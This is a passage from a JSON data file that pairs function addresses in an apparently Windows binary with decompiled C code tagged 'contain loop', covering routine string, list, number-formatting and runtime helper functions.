        "decompiled_code": "\nchar * __fastcall fcn.00408774(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    bool bVar9;\n    \n    if ((in_EAX != NULL) && (param_2 != NULL)) {\n        uVar2 = 0xffffffff;\n        pcVar7 = param_2;\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar2 - 1;\n        if (uVar3 != 0) {\n            uVar4 = 0xffffffff;\n            pcVar7 = in_EAX;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                cVar1 = *pcVar7;\n                pcVar7 = pcVar7 + 1;\n            } while (cVar1 != '\\0');\n            iVar5 = ~uVar4 - uVar3;\n            bVar9 = iVar5 == 0;\n            if (uVar3 <= ~uVar4 && !bVar9) {\n                do {\n                    pcVar7 = param_2 + 1;\n                    pcVar8 = in_EAX;\n                    do {\n                        in_EAX = pcVar8;\n                        if (iVar5 == 0) break;\n                        iVar5 = iVar5 + -1;\n                        in_EAX = pcVar8 + 1;\n                        bVar9 = *param_2 == *pcVar8;\n                        pcVar8 = in_EAX;\n                    } while (!bVar9);\n                    iVar6 = ~uVar2 - 2;\n                    pcVar8 = in_EAX;\n                    if (!bVar9) {\n                        return NULL;\n                    }\n                    do {\n                        if (iVar6 == 0) break;\n                        bVar9 = *pcVar7 == *pcVar8;\n                        iVar6 = iVar6 + -1;\n                        pcVar8 = pcVar8 + 1;\n                        pcVar7 = pcVar7 + 1;\n                    } while (bVar9);\n                    if (bVar9) {\n                        return in_EAX + -1;\n                    }\n                } while( true );\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 578
    },
    "004089ea": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004089ea(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *puVar3;\n    char cVar4;\n    int16_t iVar6;\n    uint32_t uVar7;\n    uint extraout_ECX;\n    unkbyte3 Var8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t unaff_EBP;\n    uint8_t *puVar11;\n    float10 fVar12;\n    float10 fVar13;\n    float10 fVar14;\n    uint var_69h;\n    uint var_59h;\n    uint var_49h;\n    uint var_28h;\n    uint var_24h;\n    uint var_18h;\n    uint var_ch;\n    uint var_4h;\n    char cVar5;\n    \n    iVar9 = *(unaff_EBP + -0xc);\n    if (iVar9 <= *(unaff_EBP + 8)) {\n        *(unaff_EBP + -0xc) = *(unaff_EBP + -0xc) + 1;\n    // WARNING: Could not recover jumptable at 0x00408a0a. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x408a11\n        (**(*(*(unaff_EBP + 0xc) + iVar9 * 8 + 4) * 4 + 0x408a11))();\n        return;\n    }\n    do {\n        fcn.00408c17();\n        puVar3 = fcn.00408838();\n        uVar10 = *(unaff_EBP + -0x24);\n        if (0x20 < uVar10) {\n            uVar10 = 0;\n        }\n        cVar5 = extraout_ECX;\n        Var8 = extraout_ECX >> 8;\n        cVar4 = cVar5 + -0x44;\n        if (cVar4 == '\\0') break;\n        cVar4 = '\\x10';\n        Var8 = 0;\n        if (cVar5 == 'X') break;\n        cVar4 = '\\n';\n        Var8 = 0;\n    } while (cVar5 != 'U');\n    iVar6 = CONCAT31(Var8, cVar4);\n    if ((cVar4 == '\\0') && (iVar6 = 10,  (*(puVar3 + 4) & 0x80000000) != 0)) {\n        fcn.00407ea4(-*puVar3, -(*(puVar3 + 4) + (*puVar3 != 0)));\n        *(unaff_EBP + -0x4a) = 0x2d;\n        return;\n    }\n    if ((*(puVar3 + 4) & 0x80000000) == 0) {\n        fVar14 = *puVar3;\n    }\n    else {\n        fVar14 = 0x7fffffffffffffff + 1 + (*puVar3 & 0x7fffffffffffffff);\n    }\n    fVar12 = iVar6;\n    puVar11 = unaff_EBP + -0x49;\n    do {\n        puVar11 = puVar11 + -1;\n        fVar13 = fVar14 - (fVar14 / fVar12) * fVar12;\n        fVar14 = fVar14 / fVar12;\n        var_4h._0_1_ = ROUND(fVar13);\n        uVar2 = var_4h + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = var_4h + 0x37;\n        }\n        *puVar11 = uVar2;\n    } while (1 <= fVar14);\n    uVar7 = (unaff_EBP + -0x49) - puVar11;\n    iVar9 = uVar10 - uVar7;\n    if (uVar7 <= uVar10 && iVar9 != 0) {\n        iVar1 = -iVar9;\n        while (iVar9 = iVar9 + -1,  iVar9 != 0) {\n            (puVar11 + iVar1)[iVar9] = 0x30;\n        }\n        puVar11[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 983
    },
    "00409387": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00409387(void)\n\n{\n    char cVar1;\n    char *unaff_ESI;\n    \n    do {\n        cVar1 = *unaff_ESI;\n        if (cVar1 == '\\0') {\n            return;\n        }\n        unaff_ESI = unaff_ESI + 1;\n    } while (cVar1 == ' ');\n    return;\n}\n",
        "token_count": 84
    },
    "0040a478": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a478(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *param_2;\n    while( true ) {\n        iVar1 = fcn.00404268();\n        if ((iVar1 < iVar2) || (*(in_EAX + -1 + iVar2) != ' ')) break;\n        iVar2 = iVar2 + 1;\n    }\n    *param_2 = iVar2;\n    return;\n}\n",
        "token_count": 126
    },
    "0040a5f4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040a5f4(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 1;\n    while( true ) {\n        iVar2 = fcn.00404268();\n        if (iVar2 < iVar3) {\n            return 0;\n        }\n        uVar1 = *(in_EAX + -1 + iVar3) & 0xdf;\n        if (uVar1 == 0x44) {\n            return 1;\n        }\n        if (uVar1 == 0x45) {\n            return 2;\n        }\n        if (uVar1 == 0x4d) break;\n        if (uVar1 == 0x59) {\n            return 2;\n        }\n        iVar3 = iVar3 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 200
    },
    "0040c378": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040c378(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = fcn.0040c3a0();\n    iVar3 = iVar2;\n    if (param_2 != '\\0') {\n        while (iVar1 = iVar3,  iVar1 != 0) {\n            iVar3 = fcn.0040c3a0();\n            iVar2 = iVar1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 126
    },
    "0040c3a0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040c3a0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.00408760();\n    while ((iVar2 != 0 && (cVar1 = fcn.0040bf10(),  cVar1 != '\\0'))) {\n        iVar2 = fcn.00408760();\n    }\n    return iVar2;\n}\n",
        "token_count": 91
    },
    "0040ca6c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040ca6c(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    cVar1 = '\\x01';\n    for (puVar2 = *0x46130c; (cVar1 != '\\0' && (puVar2 != NULL)); puVar2 = *puVar2) {\n        cVar1 = (*puVar2[1])();\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "0040cb94": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040cb94(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    uVar1 = fcn.0040cb7c();\n    iVar2 = sub.kernel32.dll_GetCurrentThreadId_1();\n    for (puVar3 = *(in_EAX + 4 + (uVar1 & 0xff) * 4); (puVar3 != NULL && (iVar2 != puVar3[1])); puVar3 = *puVar3) {\n    }\n    if (puVar3 == NULL) {\n        puVar3 = fcn.0040cc1c();\n        if (puVar3 == NULL) {\n            puVar3 = fcn.00407ab0();\n            puVar3[1] = iVar2;\n            puVar3[2] = 0x7fffffff;\n            *puVar3 = puVar3;\n            uVar4 = fcn.0040cb1c();\n            *puVar3 = uVar4;\n        }\n    }\n    *param_2 = puVar3;\n    return;\n}\n",
        "token_count": 269
    },
    "0040e544": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040e544(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    iVar1 = 8;\n    do {\n        var_4h = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    var_14h = 0x40e789;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0040e544::var_18h;\n    if (in_EAX < -0x7ffdfff5) {\n        if (in_EAX == -0x7ffdfff6) {\n            var_1ch = 0x40e61a;\n            var_10h = &stack0xfffffffc;\n            fcn.00405b0c();\n            var_1ch = 0x40e629;\n            fcn.0040b538();\n            var_1ch = 0x40e62e;\n            fcn.004039e4();\n            goto code_r0x0040e761;\n        }\n        if (in_EAX < -0x7ffdfffa) {\n            if (in_EAX == -0x7ffdfffb) {\n                var_1ch = 0x40e5d8;\n                var_10h = &stack0xfffffffc;\n                fcn.0040e310();\n                goto code_r0x0040e761;\n            }\n            if (in_EAX == -0x7fffbfff) {\n                var_1ch = 0x40e68c;\n                var_10h = &stack0xfffffffc;\n                fcn.00405b0c();\n                var_1ch = 0x40e69b;\n                fcn.0040b538();\n                var_1ch = 0x40e6a0;\n                fcn.004039e4();\n                goto code_r0x0040e761;\n            }\n            if (in_EAX == -0x7fff0001) {\n                var_1ch = 0x40e6fb;\n                var_10h = &stack0xfffffffc;\n                fcn.00405b0c();\n                var_1ch = 0x40e70a;\n                fcn.0040b538();\n                var_1ch = 0x40e70f;\n                fcn.004039e4();\n                goto code_r0x0040e761;\n            }\n        }\n        else {\n            if (in_EAX == -0x7ffdfff8) {\n                var_1ch = 0x40e5ea;\n                var_10h = &stack0xfffffffc;\n                fcn.00405b0c();\n                var_1ch = 0x40e5f9;\n                fcn.0040b538();\n                var_1ch = 0x40e5fe;\n                fcn.004039e4();\n                goto code_r0x0040e761;\n            }\n            if (in_EAX == -0x7ffdfff7) {\n                var_1ch = 0x40e608;\n                var_10h = &stack0xfffffffc;\n                fcn.0040e400();\n                goto code_r0x0040e761;\n            }\n        }\n    }\n    else {\n        if (in_EAX == -0x7ffdfff5) {\n            var_1ch = 0x40e640;\n            fcn.00405b0c();\n            var_1ch = 0x40e64f;\n            fcn.0040b538();\n            var_1ch = 0x40e654;\n            fcn.004039e4();\n            goto code_r0x0040e761;\n        }\n        if (in_EAX == -0x7ffdfff3) {\n            var_1ch = 0x40e666;\n            var_10h = &stack0xfffffffc;\n            fcn.00405b0c();\n            var_1ch = 0x40e675;\n            fcn.0040b538();\n            var_1ch = 0x40e67a;\n            fcn.004039e4();\n            goto code_r0x0040e761;\n        }\n        if (in_EAX == -0x7ff8fff2) {\n            var_1ch = 0x40e6b2;\n            var_10h = &stack0xfffffffc;\n            fcn.00405b0c();\n            var_1ch = 0x40e6c1;\n            fcn.0040b538();\n            var_1ch = 0x40e6c6;\n            fcn.004039e4();\n            goto code_r0x0040e761;\n        }\n        if (in_EAX == -0x7ff8ffa9) {\n            var_1ch = 0x40e6d8;\n            var_10h = &stack0xfffffffc;\n            fcn.00405b0c();\n            var_1ch = 0x40e6e7;\n            fcn.0040b538();\n            var_1ch = 0x40e6ec;\n            fcn.004039e4();\n            goto code_r0x0040e761;\n        }\n    }\n    var_38h = **0x462190;\n    var_34h._0_1_ = 0xb;\n    var_2ch._0_1_ = 0;\n    var_1ch = 0x40e730;\n    var_10h = &stack0xfffffffc;\n    fcn.0040ad30();\n    var_1ch = &fcn.0040e544::var_38h;\n    var_20h = 2;\n    var_24h = 0x40e74d;\n    fcn.00405b0c();\n    var_24h = 0x40e75c;\n    fcn.0040b574(var_20h, var_1ch);\n    var_24h = 0x40e761;\n    fcn.004039e4();\ncode_r0x0040e761:\n    *in_FS_OFFSET = var_20h;\n    var_18h = 0x40e790;\n    var_1ch = 0x40e77b;\n    fcn.00403fcc();\n    var_1ch = 0x40e788;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 1612
    },
    "004108d4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004108d4(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    \n    if (param_2 != 0) {\n        iVar2 = **(in_EAX + 0xb + *(in_EAX + 1));\n        uVar3 = *(iVar2 + 1);\n        puVar4 = iVar2 + 0xf + uVar3;\n        piVar1 = iVar2 + 7 + uVar3;\n        iVar2 = 0;\n        do {\n            uVar3 = uVar3 & 0xffffff00 | *puVar4;\n            if (uVar3 == *(param_2 + -4)) {\n                while (((*((uVar3 - 1) + param_2) ^ puVar4[uVar3]) & 0xdf) == 0) {\n                    uVar3 = uVar3 - 1;\n                    if (uVar3 == 0) {\n                        return iVar2;\n                    }\n                }\n                uVar3 = uVar3 & 0xffffff00 | *puVar4;\n            }\n            iVar2 = iVar2 + 1;\n            puVar4 = puVar4 + uVar3 + 1;\n        } while (iVar2 <= *piVar1);\n    }\n    return -1;\n}\n",
        "token_count": 322
    },
    "00410984": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410984(uint param_1, uchar *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint8_t uVar4;\n    uchar *puVar3;\n    uchar *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    \n    if (in_EAX != 0) {\n        puVar3 = param_2;\n        if (param_2 != NULL) {\n            puVar3 = CONCAT11(*param_2, param_2[-4]) & 0xdfff;\n        }\n        while( true ) {\n            iVar1 = in_EAX + 2 + *(in_EAX + 1);\n            uVar6 = *(iVar1 + 10);\n            uVar7 = *(iVar1 + 0xb + uVar6);\n            if (uVar7 != 0) {\n                iVar2 = iVar1 + 0xd + uVar6;\n                do {\n                    puVar5 = uVar6 & 0xffff0000 | *(iVar2 + 0x1a) & 0xffffdfff;\n                    if (puVar5 == puVar3) {\n                        uVar6 = uVar6 & 0xffff0000 | *(iVar2 + 0x1a) & 0xffff00ff;\n                        while( true ) {\n                            uVar4 = param_2[uVar6 - 1] ^ *(iVar2 + 0x1a + uVar6);\n                            if ((uVar4 & 0xdf) != 0) break;\n                            uVar6 = uVar6 - 1;\n                            puVar3 = puVar3 & 0xffff0000 | CONCAT11(uVar4, puVar3);\n                            if (uVar6 == 0) {\n                                return;\n                            }\n                        }\n                        puVar3 = puVar3 & 0xffff0000 | CONCAT11(*param_2, puVar3) & 0xffffdfff;\n                        puVar5 = uVar6 & 0xffffff00 | *(iVar2 + 0x1a);\n                    }\n                    uVar6 = puVar5 & 0xffff00ff;\n                    uVar7 = uVar7 - 1;\n                    iVar2 = iVar2 + 0x1b + uVar6;\n                } while (uVar7 != 0);\n            }\n            if (*(iVar1 + 4) == NULL) break;\n            in_EAX = **(iVar1 + 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 557
    },
    "004129dc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004129dc(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar3 + -1) {\n        do {\n            uVar2 = fcn.00413b64();\n            cVar1 = fcn.004031bc();\n            if (cVar1 != '\\0') goto code_r0x00412a33;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    iVar3 = (**(**(in_EAX + 8) + 0x54))();\n    if (iVar3 < 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = (**(**(in_EAX + 8) + 0x18))();\n    }\ncode_r0x00412a33:\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 238
    },
    "00412a3c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong __fastcall fcn.00412a3c(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uStack20;\n    \n    uStack20._1_3_ = param_1 >> 8;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    uVar1 = *(in_EAX + 0xc);\n    iVar2 = *(uVar1 + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00413b64();\n            uVar1 = fcn.00403484();\n            if (uVar1 != '\\0') goto code_r0x00412a76;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    uStack20 = uStack20._1_3_ << 8;\ncode_r0x00412a76:\n    return CONCAT44(uStack20, uVar1 & 0xffffff00 | uStack20 & 0xff);\n}\n",
        "token_count": 249
    },
    "00412c04": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00412c04(uint param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x20) != param_2) {\n        *(in_EAX + 0x20) = param_2;\n        iVar3 = *(*(in_EAX + 4) + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                iVar2 = fcn.00413b64();\n                uVar1 = fcn.00412a3c();\n                *(iVar2 + 0x10) = uVar1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "00412d20": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00412d20(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    iVar1 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00413b64();\n            uVar2 = fcn.004128b0(param_2);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 144
    },
    "00412f24": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong __fastcall fcn.00412f24(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uStack20;\n    \n    uStack20._1_3_ = param_1 >> 8;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    uVar1 = *(in_EAX + 4);\n    iVar2 = *(uVar1 + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00413b64();\n            uVar1 = fcn.00412b28();\n            if (uVar1 != '\\0') goto code_r0x00412f5c;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    uStack20 = uStack20._1_3_ << 8;\ncode_r0x00412f5c:\n    return CONCAT44(uStack20, uVar1 & 0xffffff00 | uStack20 & 0xff);\n}\n",
        "token_count": 250
    },
    "00412f68": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00412f68(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00413b64();\n            iVar1 = fcn.00413bc0();\n            if (-1 < iVar1) {\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00412920();\n    fcn.00413a08();\n    return;\n}\n",
        "token_count": 145
    },
    "004132e4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004132e4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    \n    puStack12 = 0x4132f4;\n    fcn.00412f00();\n    uStack16 = 0x413349;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffec;\n    puStack12 = &stack0xfffffffc;\n    while( true ) {\n        cVar1 = fcn.00412f24();\n        if (cVar1 != '\\0') break;\n        fcn.00412f0c();\n        if (in_EAX == *0x41190c) break;\n        in_EAX = fcn.004031e4();\n    }\n    *in_FS_OFFSET = uStack20;\n    puStack12 = 0x413350;\n    uStack16 = 0x413348;\n    fcn.00412fb8();\n    return;\n}\n",
        "token_count": 236
    },
    "004137f0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004137f0(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.00405d78();\n    iVar1 = *(*(iVar1 + 8) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            piVar2 = fcn.00413b64();\n            (**(*piVar2 + 0xc))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "00413bc0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00413bc0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    for (iVar1 = 0; (iVar1 < *(in_EAX + 8) && (param_2 != *(*(in_EAX + 4) + iVar1 * 4))); iVar1 = iVar1 + 1) {\n    }\n    if (iVar1 == *(in_EAX + 8)) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 127
    },
    "00413d04": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00413d04(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((param_2 < 0) || (0x7ffffff < param_2)) {\n        fcn.00413af0();\n    }\n    if (*(in_EAX + 0xc) < param_2) {\n        fcn.00413cc8();\n    }\n    if (*(in_EAX + 8) < param_2) {\n        fcn.00402c64();\n    }\n    else {\n        iVar1 = *(in_EAX + 8) + -1;\n        iVar2 = param_2 - iVar1;\n        if (iVar2 == 0 || param_2 < iVar1) {\n            iVar2 = iVar2 + -1;\n            do {\n                fcn.00413a54();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 != 0);\n        }\n    }\n    *(in_EAX + 8) = param_2;\n    return;\n}\n",
        "token_count": 246
    },
    "00416ca4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00416ca4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar1 = *(*(in_EAX + 0x30) + 8);\n        if (-1 < iVar1 + -1) {\n            do {\n                fcn.00413b64();\n                fcn.00403258();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        fcn.00403258();\n        *(in_EAX + 0x30) = 0;\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "00416f74": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416f74(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00404da0();\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00413a08();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "004197bc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004197bc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(in_EAX + 0x1c) & 8) == 0) {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 8;\n        if ((*(in_EAX + 0x10) != 0) && (iVar1 = *(*(in_EAX + 0x10) + 8),  -1 < iVar1 + -1)) {\n            do {\n                fcn.00413b64();\n                fcn.004197bc();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "00419f2c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419f2c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if ((arg_8h != in_EAX[0x10]) || (arg_ch != in_EAX[0x11])) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00413b64(arg_8h, arg_ch);\n                (**(*piVar1 + 0x10))();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        in_EAX[0x10] = arg_8h;\n        in_EAX[0x11] = arg_ch;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 217
    },
    "00419fa8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419fa8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0x50) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.00413b64();\n            if (param_2 == iVar1) {\n                *(param_2 + 0x10) = 0;\n                fcn.00413a54();\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 159
    },
    "0041a510": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041a510(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = 0x41a520;\n    iVar1 = fcn.00413ed0();\n    uStack24 = 0x41a565;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar1 = *(iVar1 + 8);\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00413b64();\n            fcn.00403258();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41a56c;\n    uStack24 = 0x41a564;\n    fcn.00413f34();\n    return;\n}\n",
        "token_count": 229
    },
    "0041e034": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041e034(void)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    \n    iVar3 = 0xff;\n    do {\n        puVar1 = in_EAX + iVar3 * 4;\n        puVar2 = in_EAX + iVar3 * 3;\n        puVar1[2] = puVar2[2];\n        puVar1[1] = puVar2[1];\n        *puVar1 = *puVar2;\n        puVar1[3] = 0;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    *(in_EAX + 3) = 0;\n    return;\n}\n",
        "token_count": 170
    },
    "00424fe4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00424fe4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0x10) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.00423f2c();\n            (**(**(iVar1 + 4) + 0x28))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "00427820": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00427820(void)\n\n{\n    int32_t in_EAX;\n    uchar *puVar1;\n    \n    fcn.00403fa8();\n    if (in_EAX != 0) {\n        fcn.004042b4();\n        fcn.00404468();\n        puVar1 = fcn.0040c3a0();\n        while (puVar1 != NULL) {\n            *puVar1 = 0;\n            puVar1 = fcn.0040c3a0();\n        }\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "0042afdc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042afdc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    while (*(*(in_EAX + 0x210) + 8) < param_2) {\n        fcn.0042ab00();\n    }\n    while (param_2 < *(*(in_EAX + 0x210) + 8)) {\n        fcn.00413c4c();\n        fcn.00403258();\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "004367a8": {
        "rules": [
            "contain loop"
        ],
